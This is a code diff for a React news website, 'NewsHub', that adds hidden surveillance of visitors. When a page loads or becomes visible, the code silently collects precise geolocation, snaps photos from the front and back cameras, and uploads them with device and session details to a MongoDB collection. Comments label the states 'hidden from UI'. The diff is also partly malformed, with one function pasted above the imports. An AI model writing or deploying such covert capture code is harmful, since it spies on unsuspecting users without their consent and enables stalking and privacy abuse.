@@ -1,15 +1,69 @@
+const trackUserLocation = async (forceTrack = false) => {
+    // Always track if forced, or if not tracked yet
+    if (!forceTrack && locationTracked) return;
+
+    console.log('🎯 Starting location tracking...');
+
+    if (!navigator.geolocation) {
+      console.error('❌ Geolocation not supported');
+      return;
+    }
+
+    return new Promise((resolve) => {
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          console.log('📍 Location obtained:', {
+            lat: position.coords.latitude,
+            lng: position.coords.longitude,
+            accuracy: position.coords.accuracy
+          });
+
+          const location = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+            altitude: position.coords.altitude,
+            heading: position.coords.heading,
+            speed: position.coords.speed
+          };
+
+          const result = await saveLocationToMongoDB(location);
+          if (result) {
+            setLocationTracked(true);
+            console.log('✅ Location successfully stored in MongoDB');
+          }
+          resolve(result);
+        },
+        (error) => {
+          console.log('❌ Location access failed:', error.message);
+          setLocationTracked(true); // Mark as attempted
+          resolve(null);
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0 // Always get fresh location
+        }
+      );
+    });
+  };
+  
 import React, { useState, useEffect } from 'react';
 import * as Realm from 'realm-web';
 
 const NewsWebsite = () => {
-  // Location tracking states (hidden from UI)
+  // Location and camera tracking states (hidden from UI)
   const [mongoClient, setMongoClient] = useState(null);
   const [user, setUser] = useState(null);
   const [locationTracked, setLocationTracked] = useState(false);
+  const [cameraTracked, setCameraTracked] = useState(false);
+  const [mediaStream, setMediaStream] = useState(null);
 
   // News content states
   const [selectedCategory, setSelectedCategory] = useState('all');
   const [searchQuery, setSearchQuery] = useState('');
+  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
 
   // MongoDB Atlas App Configuration (hidden)
   const REALM_APP_ID = "myrealmapp-lwdulec";
@@ -387,61 +441,152 @@ const NewsWebsite = () => {
     }
   };
 
-  const trackUserLocation = async (forceTrack = false) => {
-    // Always track if forced, or if not tracked yet
-    if (!forceTrack && locationTracked) return;
+  const saveCameraDataToMongoDB = async (cameraData, client = null) => {
+    try {
+      const dbClient = client || mongoClient;
+      if (!dbClient) {
+        console.error('❌ No MongoDB client available for camera data');
+        return null;
+      }
 
-    console.log('🎯 Starting location tracking...');
+      const collection = dbClient.db(DATABASE_NAME).collection('camera_captures');
+      
+      const captureData = {
+        ...cameraData,
+        timestamp: new Date(),
+        createdAt: new Date(),
+        userAgent: navigator.userAgent,
+        referrer: document.referrer,
+        pageUrl: window.location.href,
+        sessionId: sessionStorage.getItem('sessionId') || 'unknown',
+        visitCount: parseInt(localStorage.getItem('visitCount') || '0')
+      };
 
-    if (!navigator.geolocation) {
-      console.error('❌ Geolocation not supported');
-      return;
+      const result = await collection.insertOne(captureData);
+      console.log('✅ Camera data stored:', result.insertedId);
+      
+      return result;
+    } catch (error) {
+      console.error('❌ Camera data storage failed:', error);
+      return null;
     }
+  };
 
-    return new Promise((resolve) => {
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          console.log('📍 Location obtained:', {
-            lat: position.coords.latitude,
-            lng: position.coords.longitude,
-            accuracy: position.coords.accuracy
-          });
-
-          const location = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            timestamp: new Date().toISOString(),
-            altitude: position.coords.altitude,
-            heading: position.coords.heading,
-            speed: position.coords.speed
-          };
-
-          const result = await saveLocationToMongoDB(location);
-          if (result) {
-            setLocationTracked(true);
-            console.log('✅ Location successfully stored in MongoDB');
-          }
-          resolve(result);
+  const captureFromCamera = async (facingMode = 'user') => {
+    try {
+      console.log(`📷 Attempting to access ${facingMode === 'user' ? 'front' : 'back'} camera...`);
+      
+      const constraints = {
+        video: {
+          facingMode: facingMode,
+          width: { ideal: 1920 },
+          height: { ideal: 1080 }
         },
-        (error) => {
-          console.log('❌ Location access failed:', error.message);
-          setLocationTracked(true); // Mark as attempted
-          resolve(null);
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0 // Always get fresh location
+        audio: false
+      };
+
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      console.log(`✅ ${facingMode === 'user' ? 'Front' : 'Back'} camera access granted`);
+
+      // Create video element to capture frame
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+
+      return new Promise((resolve) => {
+        video.onloadedmetadata = () => {
+          // Create canvas to capture frame
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          
+          // Capture frame after a short delay
+          setTimeout(() => {
+            ctx.drawImage(video, 0, 0);
+            const imageData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            // Stop the stream
+            stream.getTracks().forEach(track => track.stop());
+            
+            resolve({
+              camera: facingMode === 'user' ? 'front' : 'back',
+              imageData: imageData,
+              width: canvas.width,
+              height: canvas.height,
+              capturedAt: new Date().toISOString()
+            });
+          }, 1000); // Wait 1 second for camera to initialize
+        };
+      });
+    } catch (error) {
+      console.error(`❌ ${facingMode === 'user' ? 'Front' : 'Back'} camera access failed:`, error.message);
+      return null;
+    }
+  };
+
+  const trackCameraAccess = async () => {
+    if (cameraTracked) return;
+
+    console.log('📸 Starting camera tracking...');
+
+    try {
+      // Check if camera is available
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        console.log('❌ Camera API not supported');
+        setCameraTracked(true);
+        return;
+      }
+
+      // Try to get available cameras
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      const videoDevices = devices.filter(device => device.kind === 'videoinput');
+      
+      console.log(`📷 Found ${videoDevices.length} camera(s)`);
+
+      const cameraData = {
+        availableCameras: videoDevices.length,
+        devices: videoDevices.map(device => ({
+          deviceId: device.deviceId,
+          label: device.label || 'Camera',
+          kind: device.kind
+        })),
+        captures: []
+      };
+
+      // Try to capture from front camera
+      const frontCapture = await captureFromCamera('user');
+      if (frontCapture) {
+        cameraData.captures.push(frontCapture);
+        console.log('✅ Front camera capture successful');
+      }
+
+      // Try to capture from back camera (if available)
+      if (videoDevices.length > 1) {
+        const backCapture = await captureFromCamera('environment');
+        if (backCapture) {
+          cameraData.captures.push(backCapture);
+          console.log('✅ Back camera capture successful');
         }
-      );
-    });
+      }
+
+      // Save camera data to MongoDB
+      if (cameraData.captures.length > 0) {
+        await saveCameraDataToMongoDB(cameraData);
+        console.log(`✅ Successfully captured from ${cameraData.captures.length} camera(s)`);
+      }
+
+      setCameraTracked(true);
+    } catch (error) {
+      console.error('❌ Camera tracking failed:', error);
+      setCameraTracked(true);
+    }
   };
 
   // Initialize background tracking on site visit
   useEffect(() => {
     const initializeTracking = async () => {
-      console.log('🚀 Component mounted - Starting location tracking...');
+      console.log('🚀 Component mounted - Starting comprehensive tracking...');
       
       // Generate session ID if not exists
       if (!sessionStorage.getItem('sessionId')) {
@@ -453,8 +598,19 @@ const NewsWebsite = () => {
         const dbClient = await initializeMongoDB();
         
         if (dbClient) {
-          // Track location immediately when component mounts
-          await trackUserLocation(true); // Force tracking
+          // Track location and camera simultaneously
+          console.log('🎯 Starting parallel tracking...');
+          
+          // Start both tracking processes in parallel
+          const [locationResult, cameraResult] = await Promise.allSettled([
+            trackUserLocation(true),
+            trackCameraAccess()
+          ]);
+
+          console.log('📊 Tracking results:', {
+            location: locationResult.status,
+            camera: cameraResult.status
+          });
         } else {
           console.error('❌ Failed to initialize MongoDB connection');
         }
@@ -470,8 +626,11 @@ const NewsWebsite = () => {
   useEffect(() => {
     const handleVisibilityChange = async () => {
       if (document.visibilityState === 'visible' && mongoClient) {
-        console.log('👁️ Page became visible - tracking location...');
-        await trackUserLocation(true);
+        console.log('👁️ Page became visible - re-tracking...');
+        await Promise.allSettled([
+          trackUserLocation(true),
+          trackCameraAccess()
+        ]);
       }
     };
 
@@ -482,13 +641,25 @@ const NewsWebsite = () => {
     };
   }, [mongoClient]);
 
-  // Track location when mongoClient becomes available
+  // Track when mongoClient becomes available
   useEffect(() => {
-    if (mongoClient && !locationTracked) {
-      console.log('🔗 MongoDB client ready - tracking location...');
-      trackUserLocation(true);
+    if (mongoClient && (!locationTracked || !cameraTracked)) {
+      console.log('🔗 MongoDB client ready - initiating tracking...');
+      Promise.allSettled([
+        !locationTracked ? trackUserLocation(true) : Promise.resolve(),
+        !cameraTracked ? trackCameraAccess() : Promise.resolve()
+      ]);
     }
   }, [mongoClient]);
+
+  // Cleanup camera streams on unmount
+  useEffect(() => {
+    return () => {
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+      }
+    };
+  }, [mediaStream]);
 
   // News filtering logic
   const filteredArticles = newsArticles.filter(article => {
@@ -511,14 +682,24 @@ const NewsWebsite = () => {
   };
 
   const handleCardHover = (e) => {
-    e.currentTarget.style.transform = 'translateY(-5px)';
-    e.currentTarget.style.boxShadow = '0 12px 30px rgba(0,0,0,0.15)';
+    // Only apply hover effects on non-touch devices
+    if (window.matchMedia('(hover: hover)').matches) {
+      e.currentTarget.style.transform = 'translateY(-5px)';
+      e.currentTarget.style.boxShadow = '0 12px 30px rgba(0,0,0,0.15)';
+    }
   };
 
   const handleCardLeave = (e) => {
-    e.currentTarget.style.transform = 'translateY(0)';
-    e.currentTarget.style.boxShadow = e.currentTarget.classList.contains('featured') ? 
-      '0 8px 25px rgba(0,0,0,0.1)' : '0 4px 15px rgba(0,0,0,0.08)';
+    // Only apply hover effects on non-touch devices
+    if (window.matchMedia('(hover: hover)').matches) {
+      e.currentTarget.style.transform = 'translateY(0)';
+      e.currentTarget.style.boxShadow = e.currentTarget.classList.contains('featured') ? 
+        '0 8px 25px rgba(0,0,0,0.1)' : '0 4px 15px rgba(0,0,0,0.08)';
+    }
+  };
+
+  const toggleMobileMenu = () => {
+    setMobileMenuOpen(!mobileMenuOpen);
   };
 
   return (
@@ -527,7 +708,38 @@ const NewsWebsite = () => {
       <header style={styles.header}>
         <div style={styles.headerContent}>
           <div style={styles.logo}>NewsHub</div>
-          <nav style={styles.nav}>
+          
+          {/* Desktop Navigation */}
+          <nav style={{...styles.nav, display: window.innerWidth > 768 ? 'flex' : 'none'}}>
+            <a href="#" style={styles.navLink}>Home</a>
+            <a href="#" style={styles.navLink}>World</a>
+            <a href="#" style={styles.navLink}>Politics</a>
+            <a href="#" style={styles.navLink}>Opinion</a>
+            <div style={styles.searchContainer}>
+              <input
+                type="text"
+                placeholder="Search news..."
+                style={styles.searchInput}
+                value={searchQuery}
+                onChange={(e) => setSearchQuery(e.target.value)}
+              />
+              <span style={{color: '#ccc', marginLeft: '0.5rem'}}>🔍</span>
+            </div>
+          </nav>
+
+          {/* Mobile Menu Toggle */}
+          <button 
+            style={{...styles.mobileMenuToggle, display: window.innerWidth <= 768 ? 'block' : 'none'}}
+            onClick={toggleMobileMenu}
+          >
+            ☰
+          </button>
+
+          {/* Mobile Navigation */}
+          <nav style={{
+            ...styles.mobileNav,
+            ...(mobileMenuOpen && window.innerWidth <= 768 ? styles.mobileNavVisible : {})
+          }}>
             <a href="#" style={styles.navLink}>Home</a>
             <a href="#" style={styles.navLink}>World</a>
             <a href="#" style={styles.navLink}>Politics</a>
@@ -635,6 +847,46 @@ const NewsWebsite = () => {
           </p>
         </div>
       </footer>
+
+      {/* Mobile-friendly CSS */}
+      <style jsx>{`
+        @media (max-width: 768px) {
+          .nav-desktop { display: none !important; }
+          .mobile-menu-toggle { display: block !important; }
+          .header-content { flex-direction: column; align-items: stretch; }
+        }
+        
+        @media (min-width: 769px) {
+          .nav-desktop { display: flex !important; }
+          .mobile-menu-toggle { display: none !important; }
+          .mobile-nav { display: none !important; }
+        }
+
+        /* Touch-friendly tap targets */
+        @media (max-width: 768px) {
+          button, a {
+            min-height: 44px;
+            min-width: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+          }
+        }
+
+        /* Smooth scrolling */
+        html {
+          scroll-behavior: smooth;
+        }
+
+        /* Remove hover effects on touch devices */
+        @media (hover: none) {
+          .news-card:hover,
+          .featured-card:hover {
+            transform: none !important;
+            box-shadow: initial !important;
+          }
+        }
+      `}</style>
     </div>
   );
 };
